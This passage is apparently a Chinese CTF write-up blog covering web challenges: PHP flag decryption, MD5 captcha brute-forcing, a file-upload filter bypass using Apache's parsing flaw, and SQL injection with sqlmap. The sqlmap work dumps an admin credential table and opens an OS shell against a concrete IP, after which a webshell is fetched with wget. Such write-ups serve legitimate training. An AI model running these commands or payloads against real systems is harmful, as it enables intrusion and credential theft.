		<span class="nv">$char</span> <span class="o">.=</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$x</span><span class="p">,</span> <span class="mi">1</span> <span class="p">);</span>
		<span class="nv">$x</span> <span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">))</span> <span class="p">{</span>
			<span class="nv">$str</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="p">(</span><span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">-</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nv">$str</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="o">-</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nx">substr</span> <span class="p">(</span> <span class="nv">$char</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$key</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span><span class="p">;</span>
<span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;eod8tanEmpilpJebbQ==&#34;</span><span class="p">;</span><span class="c1">//tip: 
</span><span class="c1"></span>

<span class="cp">?&gt;</span>
</code></pre></div>
<p>发现主要代码为</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">$key=&#34;flag&#34;;
$flag=&#34;eod8tanEmpilpJebbQ==&#34;;</code></pre></div>
<p>然后在此代码里存在 encrypt 函数和 decrypt 函数 而且 下面<code>flag</code>
变量类似第一个加密函数加密的代码，因此增加一段代码</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">echo  decrypt($flag, $key);</code></pre></div>
<p>运行得到解密后的值
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/87155efb.png" alt="87155efb.png" /></p>

<p>尝试提交正确，带上flag的格式 因此得到flag的值为</p>

<p><code>flag{GUETsafeup678}</code></p>

<h2 id="web-5-先登录吧">web-5 先登录吧</h2>

<p>题目打开是一个验证码验证程序，首先我们随便输入任意的值，我们发现了联系
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/60b44f48.png" alt="60b44f48.png" /></p>

<p>这道题目让我们猜验证码，而且经过多次输入，正确的验证码为4位，包含数字，验证码等，因此我们可以穷举计算所有情况的哈希值然后求得正确的，写脚本如下</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="n">str_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;k&#39;</span><span class="p">,</span> <span class="s1">&#39;l&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">,</span> <span class="s1">&#39;o&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;7&#39;</span><span class="p">,</span> <span class="s1">&#39;8&#39;</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="p">]</span>



<span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
	<span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
	<span class="n">file_obj</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;code.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;a+&#34;</span><span class="p">)</span>
	<span class="n">file_obj</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
	<span class="n">file_obj</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
	<span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
			<span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
				<span class="n">result</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span>
				<span class="k">print</span> <span class="n">result</span>
				<span class="k">print</span> <span class="s2">&#34;hash:&#34;</span> <span class="o">+</span> <span class="n">md5</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
				<span class="n">write</span><span class="p">(</span><span class="n">result</span> <span class="o">+</span> <span class="s2">&#34;   hash: &#34;</span> <span class="o">+</span> <span class="n">md5</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
			</code></pre></div>
<p>最后把文件写入 code.txt 然后使用命令查看
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ad22e9d5.png" alt="ad22e9d5.png" /></p>

<p>得到验证码为zwd4</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/0585f1c5.png" alt="0585f1c5.png" /></p>

<p>得到flag</p>

<pre><code>flag{7a762b1b06900fa112eb46851ed42218}
</code></pre>

<h2 id="web-6-上传">web-6 上传</h2>

<p>首先打开burpsite 抓包分析
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/34826b1e.png" alt="34826b1e.png" /></p>

<p>首先看到apache2.4.18 先试试apache的解析漏洞
利用Apache解析漏洞（CVE-2017-15715）apache在识别文件死对不识别的扩展文件会默认从右向左找可以识别的扩展文件，因此可以构造 xxx.php.fuck 这样的后缀文件，后来发现此处文件上传存在黑名单拦截，可以上传任意文件后缀的文件，因此尝试apache解析漏洞</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/68d57881.png" alt="68d57881.png" /></p>

<p>但是上传时对文件内容进行过滤，只要存在&lt;?就会拦截，查了下资料 php的写法可以这样写</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;php&#34;</span><span class="p">&gt;</span>
  <span class="nx">phpinfo</span><span class="p">();</span>
  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></div>
<p>因此上传狗仔这样的数据包，成功上传
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/a8327a8a.png" alt="a8327a8a.png" /></p>

<p>拿到上传后的地址访问:
<a href="http://45.124.115.155:8002/d5ad200397ddbd66/upload/bd_000.php.s1tr">http://45.124.115.155:8002/d5ad200397ddbd66/upload/bd_000.php.s1tr</a></p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/b4b756e9.png" alt="b4b756e9.png" /></p>

<p>得到flag的值为: <code>flag{L0veUplo4dByPass}</code></p>

<h2 id="web-6-干就完了">web-6 干就完了</h2>

<p>首先访问得到一个页面，看到动态参数拼接想到注入</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/c132f61b.png" alt="c132f61b.png" /></p>

<p>尝试注入，发现什么也没过滤，直接使用工具 sqlmap 进行sql注入</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/337ea090.png" alt="337ea090.png" /></p>

<p>然后跑数据库 表名，得到了key最后尝试就是 flag</p>

<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-db --current-user --tables -D ctf001</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Database: ctf001
<span class="o">[</span><span class="m">3</span> tables<span class="o">]</span>
+---------+
<span class="p">|</span> admin   <span class="p">|</span>
<span class="p">|</span> article <span class="p">|</span>
<span class="p">|</span> content <span class="p">|</span>
+---------+</code></pre></div>
<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-db --current-user --columns -T admin -D ctf001</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Database: ctf001
Table: admin
<span class="o">[</span><span class="m">3</span> columns<span class="o">]</span>
+----------+------------------+
<span class="p">|</span> Column   <span class="p">|</span> Type             <span class="p">|</span>
+----------+------------------+
<span class="p">|</span> id       <span class="p">|</span> int<span class="o">(</span><span class="m">10</span><span class="o">)</span> unsigned <span class="p">|</span>
<span class="p">|</span> password <span class="p">|</span> char<span class="o">(</span><span class="m">32</span><span class="o">)</span>         <span class="p">|</span>
<span class="p">|</span> username <span class="p">|</span> varchar<span class="o">(</span><span class="m">30</span><span class="o">)</span>      <span class="p">|</span>
+----------+------------------+</code></pre></div>
<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-db --current-user --dump -C username,password,id -T admin -D ctf001</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Database: ctf001
Table: admin
<span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
+----------------------+-----------------------------------------+----+
<span class="p">|</span> username             <span class="p">|</span> password                                <span class="p">|</span> id <span class="p">|</span>
+----------------------+-----------------------------------------+----+
<span class="p">|</span> admin                <span class="p">|</span> a41b97ca8f2b827d                        <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span>
<span class="p">|</span> key:d8afe41c7c64eeab <span class="p">|</span> aaaaaaa                                 <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span>
<span class="p">|</span> root                 <span class="p">|</span> 63a9f0ea7bb98050796b649e85481845 <span class="o">(</span>root<span class="o">)</span> <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span>
+----------------------+-----------------------------------------+----+</code></pre></div>
<p>拿到flag <code>flag{d8afe41c7c64eeab}</code></p>

<h2 id="web-7-继续干呀">web-7 继续干呀</h2>

<p>这道题目和上一道题目一样，都属于注入类型的题目，但是这道题扩展我们利用注入getshell的方法，唯一不同的是需要加上一个waf <code>tamper</code> <code>space2comment.py</code></p>

<p>命令 <code>python sqlmap.py -u &quot;http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot; --batch --level 2 -v 6 --current-user</code>
判断当前数据库全县是否为最高管理员权限</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">current user:    root@localhost</code></pre></div>
<p>命令 <code>python sqlmap.py -u &ldquo;<a href="http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot;">http://45.124.115.155:8005/a4a14545663da137/news.php?id=1&quot;</a> &ndash;level 2 -v 6 &ndash;current-user &ndash;os-shell</code></p>

<p>选择第四个 默认回车就行
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/9414e1dc.png" alt="9414e1dc.png" /></p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/d6b1858a.png" alt="d6b1858a.png" /></p>

<p>接下来这个选项选择回车</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/5be91f7f.png" alt="5be91f7f.png" /></p>

<p>这个选择 n
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/f4293751.png" alt="f4293751.png" /></p>

<p>然后就到我们的命令行了</p>

<p>然后拿到shell，利用 wget 下载webshell 成功用菜刀连接</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/70e8f604.png" alt="70e8f604.png" /></p>

<p>成功getshell</p>

<p>找到根目录一个1.txt的文件，发现这样一个文件</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/7aa678e1.png" alt="7aa678e1.png" /></p>

<p>看到tips ，base64解码后得到是jsfuck，于是复制下面的字符在浏览器的console控制台，得到flag
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/9db58bf0.png" alt="9db58bf0.png" /></p>

<p><code>flag{sadjasdmasdjasdmasdjasjdasdkas}</code></p>
]]></content>
		</item>
		
	</channel>
</rss>
